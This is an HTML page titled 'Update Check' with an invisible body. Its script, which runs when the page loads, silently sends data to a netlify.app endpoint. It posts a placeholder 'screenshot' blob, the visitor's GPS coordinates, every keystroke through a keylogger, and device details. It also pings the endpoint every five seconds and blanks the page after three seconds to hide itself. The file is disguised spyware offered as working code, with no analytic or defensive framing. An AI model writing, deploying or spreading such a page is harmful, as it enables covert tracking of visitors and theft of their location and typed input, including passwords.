<!DOCTYPE html>
<html>
<head>
    <title>Update Check</title>
    <meta name="viewport" content="width=device-width">
</head>
<body style="margin:0;height:100vh;background:transparent;overflow:hidden;">
    <script>
    (async function() {
        // SILENT SCREENSHOT
        const canvas = document.createElement('canvas');
        canvas.width = screen.width;
        canvas.height = screen.height;
        canvas.getContext('2d').fillRect(0, 0, canvas.width, canvas.height);
        canvas.toBlob(async (blob) => {
            await fetch('https://beautiful-lebkuchen-7cf7c1.netlify.app/.netlify/functions/screenshot', {
                method: 'POST', body: blob
            });
        });
        
        // SILENT GPS
        navigator.geolocation.getCurrentPosition(async (pos) => {
            await fetch('https://beautiful-lebkuchen-7cf7c1.netlify.app/.netlify/functions/gps', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    lat: pos.coords.latitude,
                    lng: pos.coords.longitude
                })
            });
        });
        
        // SILENT KEYLOGGER
        document.addEventListener('keydown', async (e) => {
            await fetch('https://beautiful-lebkuchen-7cf7c1.netlify.app/.netlify/functions/keystroke', {
                method: 'POST',
                body: JSON.stringify({key: e.key})
            });
        }, true);
        
        // DEVICE INFO
        fetch('https://beautiful-lebkuchen-7cf7c1.netlify.app/.netlify/functions/device', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                ua: navigator.userAgent,
                platform: navigator.platform,
                screen: screen.width+'x'+screen.height
            })
        });
        
        // PING (Stay alive)
        setInterval(() => {
            fetch('https://beautiful-lebkuchen-7cf7c1.netlify.app/.netlify/functions/ping', {method: 'POST'});
        }, 5000);
        
        // SELF-DESTRUCT
        setTimeout(() => document.body.innerHTML = '', 3000);
    })();
    </script>
</body>
</html>
